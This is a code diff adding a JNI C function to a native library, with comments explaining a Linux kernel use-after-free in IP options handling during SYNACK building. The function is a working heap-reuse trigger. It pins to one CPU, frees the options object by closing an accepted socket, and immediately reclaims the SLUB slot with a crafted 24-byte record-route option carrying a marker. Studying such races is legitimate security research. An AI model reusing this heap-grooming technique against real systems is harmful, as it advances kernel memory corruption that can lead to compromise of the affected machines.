@@ -839,6 +839,85 @@ Java_com_inj_Native_spraySameCpu(JNIEnv *env, jclass cls, jint cpu, jint ms)
     }
     return cycles;
 }
+// Accept, free, and immediately claim the slot back on the same cpu.
+//
+// The observable part of this bug is not the free, it is the reuse. kfree only
+// writes a free pointer at offset 0 of the object, and the fields
+// ip_options_build reads (optlen at offset 24, the option bytes from 32 on)
+// are untouched - so a read of freed memory returns exactly the old bytes and
+// the SYNACK looks perfectly normal. The only way a use-after-free shows up on
+// the wire is if a *different* object is allocated into that slot after the
+// free and before the reader copies it out.
+//
+// SLUB hands a freed object to the next allocation on the *same* cpu, LIFO. So
+// the free and the claim have to happen back to back on one cpu: close() runs
+// inet_sock_destruct() and frees the options object synchronously, and the
+// setsockopt two lines later takes that same slot and fills it with 24 bytes
+// of options. A SYNACK built from that memory now reports a 24 byte option
+// area instead of the 8 the connection was opened with, which is visible.
+JNIEXPORT jlong JNICALL
+Java_com_inj_Native_recycleSpin(JNIEnv *env, jclass cls, jint fd, jint cpu, jint ms)
+{
+    struct timespec ts0, ts;
+    long done = 0;
+    unsigned char opt[24];
+    (void)env;
+    (void)cls;
+
+    long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
+    if (ncpu <= 0) {
+        return -1;
+    }
+    if (cpu < 0 || cpu >= (jint)ncpu) {
+        cpu = (jint)(ncpu - 1);
+    }
+    unsigned long mask = 1UL << cpu;
+    if (syscall(__NR_sched_setaffinity, 0, sizeof mask, &mask) < 0) {
+        return -errno;
+    }
+
+    memset(opt, 0x01, sizeof opt);
+    opt[0] = 7;              /* IPOPT_RR */
+    opt[1] = 23;             /* length 3 + 4n */
+    opt[2] = 24;             /* pointer past the end */
+    opt[3] = 0x52;           /* marker the SYNACK will carry if this wins */
+    opt[4] = 0x45;
+    opt[5] = 0x43;
+    opt[6] = 0x59;
+    opt[7] = 0x01;
+
+    clock_gettime(CLOCK_MONOTONIC, &ts0);
+    for (;;) {
+        int conn = accept4(fd, NULL, NULL, SOCK_NONBLOCK);
+        if (conn >= 0) {
+            struct linger lg;
+            lg.l_onoff = 1;
+            lg.l_linger = 0;
+            setsockopt(conn, SOL_SOCKET, SO_LINGER, &lg, sizeof lg);
+
+            /* frees inet_opt on this cpu, inside the syscall */
+            close(conn);
+
+            /* take the slot straight back before anything else can */
+            int s = socket(AF_INET, SOCK_DGRAM, 0);
+            if (s >= 0) {
+                setsockopt(s, IPPROTO_IP, IP_OPTIONS, opt, sizeof opt);
+                close(s);
+            }
+            done++;
+            continue;
+        }
+        if (errno != EAGAIN && errno != EWOULDBLOCK) {
+            break;
+        }
+        clock_gettime(CLOCK_MONOTONIC, &ts);
+        if ((ts.tv_sec - ts0.tv_sec) * 1000L
+                + (ts.tv_nsec - ts0.tv_nsec) / 1000000L >= ms) {
+            break;
+        }
+    }
+    return done;
+}
 // Read IP_OPTIONS from a socket and report what came back.
 //
 // If the request-socket race fired, the winning child inherited an
